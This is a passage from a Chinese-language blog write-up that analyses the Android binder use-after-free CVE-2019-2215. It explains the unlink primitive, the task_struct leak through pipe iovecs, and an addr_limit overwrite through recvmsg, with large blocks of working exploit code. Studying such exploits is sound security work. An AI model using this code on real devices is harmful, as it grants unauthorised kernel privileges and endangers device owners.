<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cpp" data-lang="cpp"><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">inline</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">list_del</span>(<span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">list_head</span> <span style="color:#f92672">*</span>entry)
{
        __list_del(entry<span style="color:#f92672">-&gt;</span>prev, entry<span style="color:#f92672">-&gt;</span>next);
        entry<span style="color:#f92672">-&gt;</span>next <span style="color:#f92672">=</span> LIST_POISON1;
        entry<span style="color:#f92672">-&gt;</span>prev <span style="color:#f92672">=</span> LIST_POISON2;
}

<span style="color:#75715e">// Here prev, next all point whead.
</span><span style="color:#75715e"></span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">inline</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">__list_del</span>(<span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">list_head</span> <span style="color:#f92672">*</span> prev, <span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">list_head</span> <span style="color:#f92672">*</span> next)
{
        next<span style="color:#f92672">-&gt;</span>prev <span style="color:#f92672">=</span> prev;
        WRITE_ONCE(prev<span style="color:#f92672">-&gt;</span>next, next);
}
</code></pre></td></tr></table>
</div>
</div><p>则unlink完成后，内存布局如下：</p>
<p><img src="/images/cve20192215/leak_task_after_unlink.jpg" alt="leaking task after unlink"></p>
<p>这里需要注意的是，在开始触发unlink前，会先在父进程用<code>writev</code>阻塞管道(前面已经把pipe的buffer设置为0x1000)</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cpp" data-lang="cpp">ioctl(binder_fd, BINDER_THREAD_EXIT, NULL);
b <span style="color:#f92672">=</span> writev(pipefd[<span style="color:#ae81ff">1</span>], iovec_array, IOVEC_ARRAY_SZ);
</code></pre></td></tr></table>
</div>
</div><ul>
<li>在unlink前，父进程<code>writev</code>将<code>iovec[10]</code>指向的<code>dummy_page_4g_aligned</code>内存块的<code>0x1000</code>内存读出写入pipe，而后阻塞。</li>
<li>而后子进程触发unlink，改写<code>iovec[11].iov_base</code>为指向<code>&amp;iovec[10].iov_len</code>的指针，接着使用<code>readv</code>读出已经被<code>writev</code>写入pipe的<code>dummy_page_4g_aligned</code>内容</li>
<li>此时<code>writev</code>读取<code>iovec[11].iov_base</code>的内容(此时已被改写为指向<code>binder_thread.wait.task_list</code>的指针)，父进程再次调用<code>readv</code>，成功读出被释放从<code>binder_thread.wait.task_list</code>开始的<code>0x1000</code>字节内容到<code>buffer</code></li>
<li>此时<code>buffer + 0xE8</code>即为<code>task</code>指针值。从而成功拿到当前进程的<code>task_struct</code>结构体地址(<code>wait</code>偏移为<code>0xa0</code>, <code>task</code>偏移为<code>0x190</code>，<code>wait.task_list</code>在<code>wait + 0x8</code>处，所以distance为<code>0x190-0xa0-0x8 = 0xe8</code>)</li>
</ul>
<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cpp" data-lang="cpp"><span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">list_head</span> {
        <span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">list_head</span> <span style="color:#f92672">*</span>next, <span style="color:#f92672">*</span>prev;
};

<span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">wait_queue_head</span> {
        spinlock_t              lock; <span style="color:#75715e">// 8 Bytes
</span><span style="color:#75715e"></span>        <span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">list_head</span>        head;
};
<span style="color:#66d9ef">typedef</span> <span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">wait_queue_head</span> wait_queue_head_t;

<span style="color:#75715e">// spinlock_t finally will be below in arm64 8Bytes
</span><span style="color:#75715e"></span><span style="color:#66d9ef">typedef</span> <span style="color:#66d9ef">struct</span> {
<span style="color:#75715e">#ifdef __AARCH64EB__
</span><span style="color:#75715e"></span>        u16 next;
        u16 owner;
<span style="color:#75715e">#else
</span><span style="color:#75715e"></span>        u16 owner;
        u16 next;
<span style="color:#75715e">#endif
</span><span style="color:#75715e"></span>} __aligned(<span style="color:#ae81ff">4</span>) arch_spinlock_t;

</code></pre></td></tr></table>
</div>
</div><p><img src="/images/cve20192215/wait_head_offset.png" alt="wait.head offset"></p>
<hr>
<p>unlink关键利用代码如下：</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cpp" data-lang="cpp">pid_t fork_ret <span style="color:#f92672">=</span> fork();
<span style="color:#66d9ef">if</span> (fork_ret <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>) err(<span style="color:#ae81ff">1</span>, <span style="color:#e6db74">&#34;fork&#34;</span>);
<span style="color:#66d9ef">if</span> (fork_ret <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>){
<span style="color:#75715e">/* Child process */</span>
prctl(PR_SET_PDEATHSIG, SIGKILL);
sleep(<span style="color:#ae81ff">2</span>);
printf(<span style="color:#e6db74">&#34;CHILD: Doing EPOLL_CTL_DEL.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
epoll_ctl(epfd, EPOLL_CTL_DEL, binder_fd, <span style="color:#f92672">&amp;</span>event);
printf(<span style="color:#e6db74">&#34;CHILD: Finished EPOLL_CTL_DEL.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
<span style="color:#75715e">// first page: dummy data
</span><span style="color:#75715e"></span><span style="color:#66d9ef">if</span> (read(pipefd[<span style="color:#ae81ff">0</span>], page_buffer, <span style="color:#66d9ef">sizeof</span>(page_buffer)) <span style="color:#f92672">!=</span> <span style="color:#66d9ef">sizeof</span>(page_buffer)) err(<span style="color:#ae81ff">1</span>, <span style="color:#e6db74">&#34;read full pipe&#34;</span>);
close(pipefd[<span style="color:#ae81ff">1</span>]);
printf(<span style="color:#e6db74">&#34;CHILD: Finished write to FIFO.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);

exit(<span style="color:#ae81ff">0</span>);
}
<span style="color:#75715e">//printf(&#34;PARENT: Calling READV\n&#34;);
</span><span style="color:#75715e"></span>ioctl(binder_fd, BINDER_THREAD_EXIT, NULL);
b <span style="color:#f92672">=</span> writev(pipefd[<span style="color:#ae81ff">1</span>], iovec_array, IOVEC_ARRAY_SZ);
printf(<span style="color:#e6db74">&#34;writev() returns 0x%x</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span>)b);
<span style="color:#75715e">// second page: leaked data
</span><span style="color:#75715e"></span><span style="color:#66d9ef">if</span> (read(pipefd[<span style="color:#ae81ff">0</span>], page_buffer, <span style="color:#66d9ef">sizeof</span>(page_buffer)) <span style="color:#f92672">!=</span> <span style="color:#66d9ef">sizeof</span>(page_buffer)) err(<span style="color:#ae81ff">1</span>, <span style="color:#e6db74">&#34;read full pipe&#34;</span>);
</code></pre></td></tr></table>
</div>
</div><h3 id="24-overwrite-addr_limit">2.4 Overwrite addr_limit</h3>
<p>前面已经拿到了进程的<code>task_struct</code>，下面将会重复类用与上面相似的<code>iovec[25]</code>布局去尝试改写<code>addr_limit</code>。 与leaking <code>task_struct</code>相比，不同之处在于本次不再用<code>writev</code>，而使用<code>recvmsg</code>去接收<code>iovsec[25]</code>，阻塞等待，直到<code>write</code>写入数据篡改<code>addr_limit</code>:</p>
<p>利用<code>socket</code>，同样可以如读写<code>iovec</code>数组：</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cpp" data-lang="cpp"><span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">msghdr</span> msg <span style="color:#f92672">=</span> {
.msg_iov <span style="color:#f92672">=</span> iovec_array,
.msg_iovlen <span style="color:#f92672">=</span> IOVEC_ARRAY_SZ
};
</code></pre></td></tr></table>
</div>
</div><p>这里只需准备好<code>msghdr</code>结构体，而后利用<code>recvmsg</code>等待数据写入<code>iovec[25]</code>即可。</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cpp" data-lang="cpp"><span style="color:#66d9ef">int</span> recvmsg_result <span style="color:#f92672">=</span> recvmsg(socks[<span style="color:#ae81ff">0</span>], <span style="color:#f92672">&amp;</span>msg, MSG_WAITALL);
</code></pre></td></tr></table>
</div>
</div><p>再看本次unlink前使用的内存布局：</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cpp" data-lang="cpp"><span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">iovec</span> iovec_array[IOVEC_ARRAY_SZ];
memset(iovec_array, <span style="color:#ae81ff">0</span>, <span style="color:#66d9ef">sizeof</span>(iovec_array));

<span style="color:#75715e">// Unlink Layout
</span><span style="color:#75715e"></span>iovec_array[IOVEC_INDX_FOR_WQ].iov_base <span style="color:#f92672">=</span> dummy_page_4g_aligned; <span style="color:#75715e">/* spinlock in the low address half must be zero */</span>
iovec_array[IOVEC_INDX_FOR_WQ].iov_len <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>; <span style="color:#75715e">/* wq-&gt;task_list-&gt;next */</span>
iovec_array[IOVEC_INDX_FOR_WQ <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>].iov_base <span style="color:#f92672">=</span> (<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>)<span style="color:#ae81ff">0xDEADBEEF</span>; <span style="color:#75715e">/* wq-&gt;task_list-&gt;prev */</span>
iovec_array[IOVEC_INDX_FOR_WQ <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>].iov_len <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x8</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">2</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x10</span>; <span style="color:#75715e">/* iov_len of previous, then this element and next element */</span>
iovec_array[IOVEC_INDX_FOR_WQ <span style="color:#f92672">+</span> <span style="color:#ae81ff">2</span>].iov_base <span style="color:#f92672">=</span> (<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>)<span style="color:#ae81ff">0xBEEFDEAD</span>;
iovec_array[IOVEC_INDX_FOR_WQ <span style="color:#f92672">+</span> <span style="color:#ae81ff">2</span>].iov_len <span style="color:#f92672">=</span> <span style="color:#ae81ff">8</span>; <span style="color:#75715e">/* should be correct from the start, kernel will sum up lengths when importing */</span>

</code></pre></td></tr></table>
</div>
</div><p><img src="/images/cve20192215/secondary_iovec_layout.jpg" alt="secondary iovec layout"></p>
<p>本次布局和前次略有不同:</p>
<ul>
<li><code>iovec[10].iov_len = 1</code>，这里在后面会在创建socket后首先写入1 Byte到<code>dummy_page_4g_aligned</code>指向的内存，令<code>write</code>下次写入时将从<code>iovsec[11].iov_base</code>指向的内存块开始写入数据。</li>
</ul>
<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cpp" data-lang="cpp"><span style="color:#66d9ef">int</span> socks[<span style="color:#ae81ff">2</span>];
<span style="color:#66d9ef">if</span> (socketpair(AF_UNIX, SOCK_STREAM, <span style="color:#ae81ff">0</span>, socks)) err(<span style="color:#ae81ff">1</span>, <span style="color:#e6db74">&#34;socketpair&#34;</span>);
<span style="color:#66d9ef">if</span> (write(socks[<span style="color:#ae81ff">1</span>], <span style="color:#e6db74">&#34;X&#34;</span>, <span style="color:#ae81ff">1</span>) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">1</span>) err(<span style="color:#ae81ff">1</span>, <span style="color:#e6db74">&#34;write socket dummy byte&#34;</span>);
</code></pre></td></tr></table>
</div>
</div><p>接下来触发unlink漏洞：</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cpp" data-lang="cpp">pid_t fork_ret <span style="color:#f92672">=</span> fork();
<span style="color:#66d9ef">if</span> (fork_ret <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>) err(<span style="color:#ae81ff">1</span>, <span style="color:#e6db74">&#34;fork&#34;</span>);
<span style="color:#66d9ef">if</span> (fork_ret <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>){
        <span style="color:#75715e">/* Child process */</span>
        prctl(PR_SET_PDEATHSIG, SIGKILL);
        sleep(<span style="color:#ae81ff">2</span>);
        printf(<span style="color:#e6db74">&#34;CHILD: Doing EPOLL_CTL_DEL.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
        epoll_ctl(epfd, EPOLL_CTL_DEL, binder_fd, <span style="color:#f92672">&amp;</span>event);
        printf(<span style="color:#e6db74">&#34;CHILD: Finished EPOLL_CTL_DEL.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
        <span style="color:#75715e">// write second_chunk
</span><span style="color:#75715e"></span>        <span style="color:#66d9ef">if</span> (write(socks[<span style="color:#ae81ff">1</span>], second_write_chunk, <span style="color:#66d9ef">sizeof</span>(second_write_chunk)) <span style="color:#f92672">!=</span> <span style="color:#66d9ef">sizeof</span>(second_write_chunk))
                err(<span style="color:#ae81ff">1</span>, <span style="color:#e6db74">&#34;write second chunk to socket&#34;</span>);
        exit(<span style="color:#ae81ff">0</span>);
}
ioctl(binder_fd, BINDER_THREAD_EXIT, NULL);
<span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">msghdr</span> msg <span style="color:#f92672">=</span> {
.msg_iov <span style="color:#f92672">=</span> iovec_array,
.msg_iovlen <span style="color:#f92672">=</span> IOVEC_ARRAY_SZ
};
<span style="color:#66d9ef">int</span> recvmsg_result <span style="color:#f92672">=</span> recvmsg(socks[<span style="color:#ae81ff">0</span>], <span style="color:#f92672">&amp;</span>msg, MSG_WAITALL);
</code></pre></td></tr></table>
</div>
</div><p><img src="/images/cve20192215/overwrite_addr_limit.jpg" alt="overwrite addr_limit"></p>
<p>这里借用P0 blog里的图。左边是unlink后的内存布局。
首先依然是利用unlink去改写<code>iovec[10].iov_len</code>和<code>iovec[11].iov_base</code>，使其指向<code>iovec[10].iov_len</code>。
而后就是本次攻击的重点，右边部分，该布局是</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cpp" data-lang="cpp"><span style="color:#66d9ef">if</span> (write(socks[<span style="color:#ae81ff">1</span>], second_write_chunk, <span style="color:#66d9ef">sizeof</span>(second_write_chunk)) <span style="color:#f92672">!=</span> <span style="color:#66d9ef">sizeof</span>(second_write_chunk))
        err(<span style="color:#ae81ff">1</span>, <span style="color:#e6db74">&#34;write second chunk to socket&#34;</span>);
</code></pre></td></tr></table>
</div>
</div><p>写入<code>second_write_chunk</code>后的效果。</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">8
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cpp" data-lang="cpp"><span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> second_write_chunk[] <span style="color:#f92672">=</span> {
        <span style="color:#ae81ff">1</span>, <span style="color:#75715e">/* iov_len */</span> (already used) <span style="color:#960050;background-color:#1e0010">*/</span>
        <span style="color:#ae81ff">0xdeadbeef</span>, <span style="color:#75715e">/* iov_base (already used) */</span>
        <span style="color:#ae81ff">0x8</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">2</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x10</span>, <span style="color:#75715e">/* iov_len (already used) */</span>
        current_ptr <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x8</span>, <span style="color:#75715e">/* next iov_base (addr_limit) */</span>
        <span style="color:#ae81ff">8</span>, <span style="color:#75715e">/* next iov_len (sizeof(addr_limit)) */</span>
        <span style="color:#ae81ff">0xfffffffffffffffe</span> <span style="color:#75715e">/* value to write - new addr_limit */</span>
};
</code></pre></td></tr></table>
</div>
</div><p>首先，此时<code>write</code>会从<code>iovec[11].iov_base</code>指向的内存开始写入数据，并且写入数据的size为<strong>0x28</strong> Bytes。而此时<code>iovec[11].iov_base</code>指向<code>iovec[10].iov_len</code>所在内存，即偏移为<code>binder_thread + 0xa8</code>处。从而将从<code>0xa8</code>偏移处，依次写入<code>second_write_chunk</code>中的数据。</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
